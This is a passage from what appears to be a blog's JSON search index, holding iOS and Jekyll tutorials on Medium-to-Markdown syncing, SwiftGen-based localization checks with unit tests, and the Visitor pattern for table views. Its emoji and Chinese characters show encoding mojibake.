lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI1MDAiIGhlaWdodD0iNTAwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }&gt; _If you have any questions or feedback, feel free to [contact me](https://www.zhgchg.li/contact)._Results: ‚ö†Ô∏è Article adjustments do not require restarting the website. After file changes, the content will render directly. If the changes do not appear after a while, the article format may be incorrect, causing rendering failure. You can check the Terminal for the cause.Download Articles from Medium and Convert to Markdown for JekyllWith basic Jekyll knowledge, let‚Äôs move forward by using the ZMediumToMarkdown tool to download existing articles from the Medium website and convert them into Markdown format to place in our Blog folder.After changing directory to the blog folder, run the following command to download all articles from the user on Medium:ZMediumToMarkdown -j Your Medium accountWaiting for all articles to finish downloading‚Ä¶ If you encounter any download issues or unexpected errors, feel free to contact me. This downloader was created by me ( development insights ) and can help you resolve problems quickly and directly.After the download is complete, return to the local website to preview the results.Done!! We have seamlessly imported the Medium article into Jekyll!Please check if the article layout is broken or if any images are missing. If so, feel free to report to me for assistance with fixing it.Upload Content to RepoAfter confirming the local preview is fine, we will push the content to the Github repo.Use the following Git commands in order:git add .git commit -m \"update post\"git pushAfter the push is complete, return to GitHub to see the Actions running the CD again:Wait about 5 minutes‚Ä¶Deployment complete!Initial Deployment and Setup CompletedAfter the initial deployment, update the following settings:Otherwise, visiting the website will only show:--- layout: home # Index page ---After clicking ‚ÄúSave,‚Äù the changes won‚Äôt take effect immediately. You need to go back to the ‚ÄúActions‚Äù page and wait for the deployment again.After redeployment, you can successfully access the website:Demo -&gt; zhgchg.liYou now also have a free personal Jekyll Blog!!About DeploymentEvery time content is pushed to the repo, it triggers a redeployment. You must wait for the deployment to succeed before the changes take effect.Bind a Custom DomainIf you don‚Äôt like the zhgchgli0718.github.io Github URL, you can buy a domain you like from Namecheap or register a free .tk domain using Dot.tk.After purchasing the domain, enter the domain backend:Add the following four Type A Record entriesA Record @ 185.199.108.153A Record @ 185.199.109.153A Record @ 185.199.110.153A Record @ 185.199.111.153After adding and configuring the domain backend, go back to Github Repo Settings:Enter your domain in the Custom domain field, then click ‚ÄúSave.‚ÄùAfter the DNS is resolved, you can use zhgchg.li to replace the original github.io URL. ‚ö†Ô∏è DNS settings take at least 5 minutes and up to 72 hours to take effect. If verification keeps failing, please try again later.Cloud-Based, Fully Automated Medium Synchronization MechanismEvery time there is a new article, do you have to manually run ZMediumToMarkdown on your computer and then push it to the project? Finding it troublesome?ZMediumToMarkdown also offers a convenient Github Action feature, allowing you to free your computer and automatically sync Medium articles to your website.Go to the Actions settings of the Repo:Click ‚ÄúNew workflow‚ÄùClick ‚Äúset up a workflow yourself‚Äù Rename the file to: ZMediumToMarkdown.yml The file content is as follows: name: ZMediumToMarkdownon: workflow_dispatch: schedule: - cron: \"10 1 15 * *\" # At 01:10 on day-of-month 15.jobs: ZMediumToMarkdown: runs-on: ubuntu-latest steps: - name: ZMediumToMarkdown Automatic Bot uses: ZhgChgLi/ZMediumToMarkdown@main with: command: '-j your Medium account' cron: Set the execution schedule (weekly? monthly? daily?). Here, it is set to run automatically at 1:15 AM on the 15th of every month. command: Enter your Medium account after -j Click the top right ‚ÄúStart commit‚Äù -&gt; ‚ÄúCommit new file‚ÄùComplete Github Action setup.After creation, return to Actions and the ZMediumToMarkdown Action will appear.Besides automatic execution at scheduled times, you can also manually trigger execution by following these steps:Actions -&gt; ZMediumToMarkdown -&gt; Run workflow -&gt; Run workflow.After execution, ZMediumToMarkdown will directly run the script on Github Action‚Äôs machine to sync Medium articles to the Repo:After running, it will also trigger a redeployment. Once redeployment is complete, the latest content will appear on the website. üöÄ No manual operation needed at all! This means you can continue updating your Medium articles in the future, and the script will automatically and thoughtfully sync the content from the cloud to your own website!My Blog RepoIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS Localization: Protect Your Localizable.strings from Accidental Corruption", "url": "/posts/zrealm-dev/ios-localization-protect-your-localizable-strings-from-accidental-corruption-48a8526c1300/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, localization, unit-testing, xcode, swift", "date": "2022-07-15 18:10:04 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Get Insurance for Multilingual Strings in iOS!Using SwiftGen &amp; UnitTest to...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Get Insurance for Multilingual Strings in iOS!Using SwiftGen &amp; UnitTest to Ensure Safe Multilingual OperationsPhoto by Mick HauptQuestionPlain Text FileiOS handles multiple languages using Localizable.strings plain text files, unlike Android, which manages them through XML format. This approach carries the risk of accidentally corrupting or missing entries in the language files during development. Additionally, multilingual errors are not detected at build time, often only discovered after release when users from certain regions report issues, significantly reducing user confidence.In a previous painful case, everyone was so used to writing Swift that they forgot to add ; in Localizable.strings. This caused the entire language version to break from the line missing the ; after going live. It was only saved by an emergency hotfix.If there is a problem with multilingual support, the key will be displayed directly to the userAs shown in the image above, if the DESCRIPTION key is missing, the app will directly display DESCRIPTION to the user.Check Requirements Localizable.strings Format Validation (Line endings must have ;, valid Key-Value pairs) The multilingual keys used in the code must have corresponding definitions in the Localizable.strings file. Each localization in the Localizable.strings file must have the corresponding Key-Value entries. Localizable.strings files cannot have duplicate keys (otherwise the value will be accidentally overwritten) SolutionWriting a Complete Inspection Tool Using SwiftThe previous approach was to ‚ÄúUse Swift Directly in Xcode to Write Shell Scripts!‚Äù referring to the Localize üèÅ tool, which uses Swift to develop a Command Line Tool for external localization file checks, then places the script in the Build Phases Run Script to run the checks during Build Time.Advantages:The inspection tool is injected externally, not relying on the project. It can run checks without using XCode or building the project. The inspection can pinpoint the exact line in a specific file. Additionally, it supports formatting functions (sorting multilingual keys from A to Z).Disadvantages:Increases build time (approximately +3 mins) and causes process divergence. If the script has issues or needs adjustment due to project structure changes, it is difficult to hand over and maintain. Since this part is outside the project, only those who add this check understand the entire logic, making it hard for other collaborators to handle. Interested readers can refer to the previous article. This article mainly explains how to use XCode 13 + SwiftGen + UnitTest to verify all functions of Localizable.strings.XCode 13 Built-in Build Time Check for Localizable.strings File Format CorrectnessAfter upgrading to XCode 13, it now includes a built-in Build Time check for the Localizable.strings file format. Tests show the check is quite thorough; besides missing ;, it also blocks extra meaningless strings.Using SwiftGen to Replace the Original NSLocalizedString String Base Access MethodSwiftGen helps us change the original NSLocalizedString string access method to object access, preventing typos and missing key declarations.SwiftGen is also a Command Line Tool; however, this tool is quite popular in the industry and has comprehensive documentation and community support, so there is no need to worry about maintenance issues after adopting it.InstallationYou can choose the installation method based on your environment or CI/CD service settings. Here, the demo uses the simplest method with CocoaPods for installation. Please note that SwiftGen is not a real CocoaPod and does not depend on the project‚Äôs code; using CocoaPods to install SwiftGen only downloads this Command Line Tool executable.Add the swiftgen pod in the podfile:pod 'SwiftGen', '~&gt; 6.0'InitAfter running pod install, open Terminal and cd into the project directory./L10NTests/Pods/SwiftGen/bin/swiftGen config initInitialize the swiftgen.yml configuration file and open it.strings: - inputs: - \"L10NTests/Supporting Files/zh-Hant.lproj/Localizable.strings\" outputs: templateName: structured-swift5 output: \"L10NTests/Supporting Files/SwiftGen-L10n.swift\" params: enumName: \"L10n\"Paste and modify to fit your project‚Äôs format:inputs: Project localization file location (it is recommended to specify the DevelopmentLocalization language file)outputs:output: The location of the converted Swift fileparams: enumName: Object nametemplateName: Conversion templateYou can run swiftGen template list to get the list of built-in templates.flat vs. structuredThe difference is that if the key style is XXX.YYY.ZZZ, the flat template will convert it to camelCase; the structured template will keep the original style and convert it into an XXX.YYY.ZZZ object.Pure Swift projects can directly use the built-in templates, but Swift mixed with Objective-C projects require custom templates:flat-swift5-objc.stencil :// swiftlint:disable all// Generated using SwiftGen ‚Äî https://github.com/SwiftGen/SwiftGen{% if tables.count &gt; 0 %}{% set accessModifier %}{% if param.publicAccess %}public{% else %}internal{% endif %}{% endset %}import Foundation// swiftlint:disable superfluous_disable_command file_length implicit_return// MARK: - Strings{% macro parametersBlock types %}{% filter removeNewlines:\"leading\" %} {% for type in types %} {% if type == \"String\" %} _ p{{forloop.counter}}: Any {% else %} _ p{{forloop.counter}}: {{type}} {% endif %} {{ \", \" if not forloop.last }} {% endfor %}{% endfilter %}{% endmacro %}{% macro argumentsBlock types %}{% filter removeNewlines:\"leading\" %} {% for type in types %} {% if type == \"String\" %} String(describing: p{{forloop.counter}}) {% elif type == \"UnsafeRawPointer\" %} Int(bitPattern: p{{forloop.counter}}) {% else %} p{{forloop.counter}} {% endif %} {{ \", \" if not forloop.last }} {% endfor %}{% endfilter %}{% endmacro %}{% macro recursiveBlock table item %} {% for string in item.strings %} {% if not param.noComments %} {% for line in string.translation\\|split:\"\\n\" %} /// {{line}} {% endfor %} {% endif %} {% if string.types %} {{accessModifier}} static func {{string.key\\|swiftIdentifier:\"pretty\"\\|lowerFirstWord\\|escapeReservedKeywords}}({% call parametersBlock string.types %}) -&gt; String { return {{enumName}}.tr(\"{{table}}\", \"{{string.key}}\", {% call argumentsBlock string.types %}) } {% elif param.lookupFunction %} {# custom localization function is mostly used for in-app lang selection, so we want the loc to be recomputed at each call for those (hence the computed var) #} {{accessModifier}} static var {{string.key\\|swiftIdentifier:\"pretty\"\\|lowerFirstWord\\|escapeReservedKeywords}}: String { return {{enumName}}.tr(\"{{table}}\", \"{{string.key}}\") } {% else %} {{accessModifier}} static let {{string.key\\|swiftIdentifier:\"pretty\"\\|lowerFirstWord\\|escapeReservedKeywords}} = {{enumName}}.tr(\"{{table}}\", \"{{string.key}}\") {% endif %} {% endfor %} {% for child in item.children %} {% call recursiveBlock table child %} {% endfor %}{% endmacro %}// swiftlint:disable function_parameter_count identifier_name line_length type_body_length{% set enumName %}{{param.enumName\\|default:\"L10n\"}}{% endset %}@objcMembers {{accessModifier}} class {{enumName}}: NSObject { {% if tables.count &gt; 1 or param.forceFileNameEnum %} {% for table in tables %} {{accessModifier}} enum {{table.name\\|swiftIdentifier:\"pretty\"\\|escapeReservedKeywords}} { {% filter indent:2 %}{% call recursiveBlock table.name table.levels %}{% endfilter %} } {% endfor %} {% else %} {% call recursiveBlock tables.first.name tables.first.levels %} {% endif %}}// swiftlint:enable function_parameter_count identifier_name line_length type_body_length// MARK: - Implementation Detailsextension {{enumName}} { private static func tr(_ table: String, _ key: String, _ args: CVarArg...) -&gt; String { {% if param.lookupFunction %} let format = {{ param.lookupFunction }}(key, table) {% else %} let format = {{param.bundle\\|default:\"BundleToken.bundle\"}}.localizedString(forKey: key, value: nil, table: table) {% endif %} return String(format: format, locale: Locale.current, arguments: args) }}{% if not param.bundle and not param.lookupFunction %}// swiftlint:disable convenience_typeprivate final class BundleToken { static let bundle: Bundle = { #if SWIFT_PACKAGE return Bundle.module #else return Bundle(for: BundleToken.self) #endif }()}// swiftlint:enable convenience_type{% endif %}{% else %}// No string found{% endif %}The above provides a template collected and customized from the internet that is compatible with both Swift and Objective-C. You can create a flat-swift5-objc.stencil file and paste the content, or click here to directly download the .zip.If using a custom template, do not use templateName; instead, declare templatePath:swiftgen.yml :strings: - inputs: - \"L10NTests/Supporting Files/zh-Hant.lproj/Localizable.strings\" outputs: templatePath: \"path/to/flat-swift5-objc.stencil\" output: \"L10NTests/Supporting Files/SwiftGen-L10n.swift\" params: enumName: \"L10n\"Just set the templatePath to the location of the .stencil template within the project.GeneratorAfter setting up, you can return to the Terminal and manually run:/L10NTests/Pods/SwiftGen/bin/swiftGenExecute the conversion. After the first conversion, manually drag the converted file (SwiftGen-L10n.swift) from Finder into the project for the code to work.Run ScriptIn Project Settings -&gt; Build Phases -&gt; + -&gt; New Run Script Phase -&gt; Paste:if [[ -f \"${PODS_ROOT}/SwiftGen/bin/swiftgen\" ]]; then echo \"${PODS_ROOT}/SwiftGen/bin/swiftgen\" \"${PODS_ROOT}/SwiftGen/bin/swiftgen\"else echo \"warning: SwiftGen is not installed. Run 'pod install --repo-update' to install it.\"fiThis way, the Generator runs every time the project is built to produce the latest conversion results.How to use in CodeBase?L10n.homeTitleL10n.homeDescription(\"ZhgChgLi\") // with arg With Object Access, typos are impossible, and keys used in the code will never be missing from the Localizable.strings file. However, SwiftGen can only generate from a specific language, so it cannot prevent a situation where a key exists in the generated language but is missing in other languages. This issue can only be protected by the UnitTest below.ConversionThe hardest part is the conversion because the completed project heavily uses NSLocalizedString, which needs to be converted to the new L10n.XXX format. It‚Äôs even more complicated if the strings have parameters, such as String(format: NSLocalizedString. Additionally, if there is mixed Objective-C, you must consider the syntax differences between Objective-C and Swift.There is no special solution; you can only write your own Command Line Tool. You may refer to the previous article ‰∏ä‰∏ÄÁØáÊñáÁ´† where Swift is used to scan the project directory and parse NSLocalizedString with Regex to create a small tool for conversion.It is recommended to convert one scenario at a time. Ensure it builds successfully before moving on to the next. Swift -&gt; NSLocalizedString without parameters Swift -&gt; NSLocalizedString with Parameters Situation OC -&gt; NSLocalizedString without parameters OC -&gt; NSLocalizedString with Parameters Scenario Use UnitTest to check for missing entries and duplicate keys between localization files and the main language fileWe can write UniTests to read the contents of .strings files from the Bundle and test them.Read .strings from Bundle and convert to object:class L10NTestsTests: XCTestCase { private var localizations: [Bundle: [Localization]] = [:] override func setUp() { super.setUp() let bundles = [Bundle(for: type(of: self))] // bundles.forEach { bundle in var localizations: [Localization] = [] bundle.localizations.forEach { lang in var localization = Localization(lang: lang) if let lprojPath = bundle.path(forResource: lang, ofType: \"lproj\"), let lprojBundle = Bundle(path: lprojPath) { let filesInLPROJ = (try? FileManager.default.contentsOfDirectory(atPath: lprojBundle.bundlePath)) ?? [] localization.localizableStringFiles = filesInLPROJ.compactMap { fileFullName -&gt; L10NTestsTests.Localization.LocalizableStringFile? in let fileName = URL(fileURLWithPath: fileFullName).deletingPathExtension().lastPathComponent let fileExtension = URL(fileURLWithPath: fileFullName).pathExtension guard fileExtension == \"strings\" else { return nil } guard let path = lprojBundle.path(forResource: fileName, ofType: fileExtension) else { return nil } return L10NTestsTests.Localization.LocalizableStringFile(name: fileFullName, path: path) } localization.localizableStringFiles.enumerated().forEach { (index, localizableStringFile) in if let fileContent = try? String(contentsOfFile: localizableStringFile.path, encoding: .utf8) { let lines = fileContent.components(separatedBy: .newlines) let pattern = \"\\\"(.*)\\\"(\\\\s*)(=){1}(\\\\s*)\\\"(.+)\\\";\" let regex = try? NSRegularExpression(pattern: pattern, options: []) let values = lines.compactMap { line -&gt; Localization.LocalizableStringFile.Value? in let range = NSRange(location: 0, length: (line as NSString).length) guard let matches = regex?.firstMatch(in: line, options: [], range: range) else { return nil } let key = (line as NSString).substring(with: matches.range(at: 1)) let value = (line as NSString).substring(with: matches.range(at: 5)) return Localization.LocalizableStringFile.Value(key: key, value: value) } localization.localizableStringFiles[index].values = values } } localizations.append(localization) } } self.localizations[bundle] = localizations } }}private extension L10NTestsTests { struct Localization: Equatable { struct LocalizableStringFile { struct Value { let key: String let value: String } let name: String let path: String var values: [Value] = [] } let lang: String var localizableStringFiles: [LocalizableStringFile] = [] static func == (lhs: Self, rhs: Self) -&gt; Bool { return lhs.lang == rhs.lang } }}We defined a Localization to store the parsed data. It searches for lproj folders in the Bundle, then finds .strings files within them. Using regular expressions, it converts multilingual strings into objects and stores them back in Localization for later testing.Here are a few points to note: Using Bundle(for: type(of: self)) to Access Resources from a Test Target Remember to set the Test Target‚Äôs STRINGS_FILE_OUTPUT_ENCODING to UTF-8, otherwise reading file content with String will fail (the default is Binary). The reason for using String reading instead of NSDictionary is that we need to test duplicate keys. Using NSDictionary will overwrite duplicate keys during reading. Remember to add the .strings file to the Test Target TestCase 1. Test for duplicate key definitions within the same .strings file:func testNoDuplicateKeysInSameFile() throws { localizations.forEach { (_, localizations) in localizations.forEach { localization in localization.localizableStringFiles.forEach { localizableStringFile in let keys = localizableStringFile.values.map { $0.key } let uniqueKeys = Set(keys) XCTAssertTrue(keys.count == uniqueKeys.count, \"Localized Strings File: \\(localizableStringFile.path) has duplicated keys.\") } } }}Input:Result:TestCase 2. Missing/extra keys compared to DevelopmentLocalization language:func testCompareWithDevLangHasMissingKey() throws { localizations.forEach { (bundle, localizations) in let developmentLang = bundle.developmentLocalization ?? \"en\" if let developmentLocalization = localizations.first(where: { $0.lang == developmentLang }) { let othersLocalization = localizations.filter { $0.lang != developmentLang } developmentLocalization.localizableStringFiles.forEach { developmentLocalizableStringFile in let developmentLocalizableKeys = Set(developmentLocalizableStringFile.values.map { $0.key }) othersLocalization.forEach { otherLocalization in if let otherLocalizableStringFile = otherLocalization.localizableStringFiles.first(where: { $0.name == developmentLocalizableStringFile.name }) { let otherLocalizableKeys = Set(otherLocalizableStringFile.values.map { $0.key }) if developmentLocalizableKeys.count &lt; otherLocalizableKeys.count { XCTFail(\"Localized Strings File: \\(otherLocalizableStringFile.path) has redundant keys.\") } else if developmentLocalizableKeys.count &gt; otherLocalizableKeys.count { XCTFail(\"Localized Strings File: \\(otherLocalizableStringFile.path) has missing keys.\") } } else { XCTFail(\"Localized Strings File not found in Lang: \\(otherLocalization.lang)\") } } } } else { XCTFail(\"developmentLocalization not found in Bundle: \\(bundle)\") } }}Input: (Compared to DevelopmentLocalization, other languages lack declared Keys)Output:Input: (DevelopmentLocalization does not have this key, but it appears in other languages)Output:SummaryCombining the above methods, we use: New XCode ensures the correctness of .strings file format ‚úÖ SwiftGen ensures that the CodeBase does not have typos or undeclared references when using multiple languages ‚úÖ UnitTest ensures the accuracy of multilingual content ‚úÖ Advantages: Fast execution speed, does not slow down Build Time As long as you are an iOS developer, you will maintain it. AdvancedLocalized File FormatThis solution cannot be achieved; you still need to use the original Command Line Tool written in Swift to accomplish it. However, the formatting part can be done in the git pre-commit; if there is no diff, no adjustment is made to avoid running it every time you build:#!/bin/shdiffStaged=${1:-\\-\\-staged} # use $1 if exists, default to --staged.git diff --diff-filter=d --name-only $diffStaged \\| grep -e 'Localizable.*\\.\\(strings\\\\|stringsdict\\)$' \\| \\ while read line; do # do format for ${line}done.stringdictThe same principle can also be applied to .stringdict.CI/CDswiftgen does not need to be placed in the build phase because it runs every time you build, and the code only appears after the build is complete. You can change it to run the command only when there are adjustments.Clearly Identify Which Key Is WrongThe UnitTest code can be optimized to clearly indicate which Key is Missing/Redundant/Duplicate.Using Third-Party Tools to Fully Free Engineers from Multilingual TasksAs mentioned in the previous talk ‚Äú2021 Pinkoi Tech Career Talk ‚Äî Secrets of High-Efficiency Engineering Teams‚Äù, multilingual work in large teams can be separated through third-party services to manage dependencies in multilingual tasks.Engineers only need to define the keys, and multilingual content will be automatically imported from the platform during the CI/CD phase, eliminating manual maintenance and reducing errors.Special ThanksWei Cao , iOS Developer @ PinkoiIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Visitor PatternÔΩúEnhance TableView Readability and Extensibility", "url": "/posts/zrealm-dev/visitor-pattern-enhance-tableview-readability-and-extensibility-60473cb47550/", "categories": "ZRealm Dev.", "tags": "ios-app-development, design-patterns, visitor-pattern, uitableview, refactoring, english, ai-translation", "date": "2022-07-08 15:58:30 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Visitor Pattern in TableViewUsing Visitor Pattern to Improve TableView Readabi...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Visitor Pattern in TableViewUsing Visitor Pattern to Improve TableView Readability and ExtensibilityPhoto by Alex wongPrefaceFollowing the previous article ‚ÄúVisitor Pattern in Swift‚Äù which introduced the Visitor pattern and a simple practical use case, this article will present another real-world application in iOS development.Requirement ScenarioTo develop a dynamic wall feature, multiple types of blocks need to be dynamically combined and displayed.Taking StreetVoice‚Äôs dynamic wall as an example:As shown in the above image, the dynamic wall is composed of various types of blocks dynamically combined: Type A: Activity Feed Type B: Tracking Recommendation Type C: New Song Updates Type D: New Album Updates Type E: New Tracking Updates Type ‚Ä¶. More The types are expected to increase as features iterate in the future.ProblemWithout any architectural design, the code might look like this:func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell { let row = datas[indexPath.row] switch row.type { case .invitation: let cell = tableView.dequeueReusableCell(withIdentifier: \"invitation\", for: indexPath) as! InvitationCell // configure cell with viewObject/viewModel... return cell case .newSong: let cell = tableView.dequeueReusableCell(withIdentifier: \"newSong\", for: indexPath) as! NewSongCell // configure cell with viewObject/viewModel... return cell case .newEvent: let cell = tableView.dequeueReusableCell(withIdentifier: \"newEvent\", for: indexPath) as! NewEventCell // configure cell with viewObject/viewModel... return cell case .newText: let cell = tableView.dequeueReusableCell(withIdentifier: \"newText\", for: indexPath) as! NewTextCell // configure cell with viewObject/viewModel... return cell case .newPhotos: let cell = tableView.dequeueReusableCell(withIdentifier: \"newPhotos\", for: indexPath) as! NewPhotosCell // configure cell with viewObject/viewModel... return cell }}func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -&gt; CGFloat { let row = datas[indexPath.row] switch row.type { case .invitation: if row.isEmpty { return 100 } else { return 300 } case .newSong: return 100 case .newEvent: return 200 case .newText: return UITableView.automaticDimension case .newPhotos: return UITableView.automaticDimension }} Hard to test: It is difficult to verify which Type corresponds to which logic output. Difficult to extend and maintain: When adding a new Type, this ViewController must be modified; cellForRow, heightForRow, willDisplay‚Ä¶ are scattered across multiple functions, making it easy to forget or make mistakes. Hard to read: All logic is on the View side. Visitor Pattern SolutionWhy?Here is the organized object relationship, as shown in the diagram below:We have many types of DataSource (ViewObject) that need to interact with various types of visitors, which is a typical example of Visitor Double Dispatch.How?To simplify the demo code, the following are used: PlainTextFeedViewObject for plain text feeds, MemoriesFeedViewObject for daily memories, and MediaFeedViewObject for image feeds to demonstrate the design.The architecture diagram applying the Visitor Pattern is as follows:First, define the Visitor interface. This interface abstractly declares the DataSource types that the visitor can accept:protocol FeedVisitor { associatedtype T func visit(_ viewObject: PlainTextFeedViewObject) -&gt; T? func visit(_ viewObject: MediaFeedViewObject) -&gt; T? func visit(_ viewObject: MemoriesFeedViewObject) -&gt; T? //...}Each operator implements the FeedVisitor interface:struct FeedCellVisitor: FeedVisitor { typealias T = UITableViewCell.Type func visit(_ viewObject: MediaFeedViewObject) -&gt; T? { return MediaFeedTableViewCell.self } func visit(_ viewObject: MemoriesFeedViewObject) -&gt; T? { return MemoriesFeedTableViewCell.self } func visit(_ viewObject: PlainTextFeedViewObject) -&gt; T? { return PlainTextFeedTableViewCell.self }}Implementing ViewObject &lt;-&gt; UITableViewCell Mapping.struct FeedCellHeightVisitor: FeedVisitor { typealias T = CGFloat func visit(_ viewObject: MediaFeedViewObject) -&gt; T? { return 30 } func visit(_ viewObject: MemoriesFeedViewObject) -&gt; T? { return 10 } func visit(_ viewObject: PlainTextFeedViewObject) -&gt; T? { return 10 }}Implementing ViewObject &lt;-&gt; UITableViewCell Height Mapping.struct FeedCellConfiguratorVisitor: FeedVisitor { private let cell: UITableViewCell init(cell: UITableViewCell) { self.cell = cell } func visit(_ viewObject: MediaFeedViewObject) -&gt; Any? { guard let cell = cell as? MediaFeedTableViewCell else { return nil } // cell.config(viewObject) return nil } func visit(_ viewObject: MemoriesFeedViewObject) -&gt; Any? { guard let cell = cell as? MediaFeedTableViewCell else { return nil } // cell.config(viewObject) return nil } func visit(_ viewObject: PlainTextFeedViewObject) -&gt; Any? { guard let cell = cell as? MediaFeedTableViewCell else { return nil } // cell.config(viewObject) return nil }}How to Implement ViewObject &lt;-&gt; Cell Configuration Mapping.When a new DataSource (ViewObject) needs to be supported, simply add a new method to the FeedVisitor interface and implement the corresponding logic in each visitor.Binding DataSource (ViewObject) and Visitor:protocol FeedViewObject { @discardableResult func accept&lt;V: FeedVisitor&gt;(visitor: V) -&gt; V.T?}Interface for ViewObject Implementation Binding:struct PlainTextFeedViewObject: FeedViewObject { func accept&lt;V&gt;(visitor: V) -&gt; V.T? where V : FeedVisitor { return visitor.visit(self) }}struct MemoriesFeedViewObject: FeedViewObject { func accept&lt;V&gt;(visitor: V) -&gt; V.T? where V : FeedVisitor { return visitor.visit(self) }}Implementation in UITableView:final class ViewController: UIViewController { @IBOutlet weak var tableView: UITableView! private let cellVisitor = FeedCellVisitor() private var viewObjects: [FeedViewObject] = [] { didSet { viewObjects.forEach { viewObject in let cellName = viewObject.accept(visitor: cellVisitor) tableView.register(cellName, forCellReuseIdentifier: String(describing: cellName)) } } } override func viewDidLoad() { super.viewDidLoad() tableView.delegate = self tableView.dataSource = self viewObjects = [ MemoriesFeedViewObject(), MediaFeedViewObject(), PlainTextFeedViewObject(), MediaFeedViewObject(), PlainTextFeedViewObject(), MediaFeedViewObject(), PlainTextFeedViewObject() ] // Do any additional setup after loading the view. }}extension ViewController: UITableViewDataSource { func numberOfSections(in tableView: UITableView) -&gt; Int { return 1 } func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -&gt; Int { return viewObjects.count } func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell { let viewObject = viewObjects[indexPath.row] let cellName = viewObject.accept(visitor: cellVisitor) let cell = tableView.dequeueReusableCell(withIdentifier: String(describing: cellName), for: indexPath) let cellConfiguratorVisitor = FeedCellConfiguratorVisitor(cell: cell) viewObject.accept(visitor: cellConfiguratorVisitor) return cell }}extension ViewController: UITableViewDelegate { func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -&gt; CGFloat { let viewObject = viewObjects[indexPath.row] let cellHeightVisitor = FeedCellHeightVisitor() let cellHeight = viewObject.accept(visitor: cellHeightVisitor) ?? UITableView.automaticDimension return cellHeight }}Result Testing: Complies with the Single Responsibility Principle, allowing tests for each data point of every visitor separately Extension and Maintenance: When supporting a new DataSource (ViewObject), simply add a method to the Visitor protocol and implement it in the respective Visitor classes. To introduce a new operator, just create a new class that implements it. Reading: You only need to browse through each visitor object to understand the composition logic of each view on the page. Complete ProjectMurmur‚Ä¶Article written during a creative low period in July 2022. Please kindly forgive any incomplete descriptions or errors!Further Reading Practical Application of Design Patterns (Encapsulating Socket.io) Practical Application of Design Patterns (Encapsulating WKWebView) Visitor Pattern in Swift (Share Object to XXX Example) If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "iOS NSAttributedString HTML RenderingÔΩúEfficient Alternative to DocumentType.html", "url": "/posts/zrealm-dev/ios-nsattributedstring-html-rendering-efficient-alternative-to-documenttype-html-a8c2d26cc734/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, nsattributedstring, html-parsing, html, markdown", "date": "2022-06-10 00:11:59 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Implementing iOS NSAttributedString HTML Render by YourselfiOS NSAttributedStr...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Implementing iOS NSAttributedString HTML Render by YourselfiOS NSAttributedString DocumentType.html AlternativePhoto by Florian Olivo[TL;DR] 2023/03/12Re-developed using a different approach: ‚ÄùZMarkupParser HTML String to NSAttributedString Tool‚Äú. For technical details and the development story, please visit ‚ÄúThe Story of Manually Building an HTML Parser‚Äù.OriginSince the release of iOS 15 last year, an app has consistently been plagued by a crash issue. According to data from the past 90 days (2022/03/11~2022/06/08), it caused over 2.4K crashes, affecting more than 1.4K users. According to the data, the official team appears to have fixed (or reduced the frequency of) this common crash issue in iOS versions ‚â• 15.2, as the data shows a downward trend.Most affected versions: iOS 15.0.X ~ iOS 15.X.XIt was also found that iOS 12 and iOS 13 had occasional crash reports, 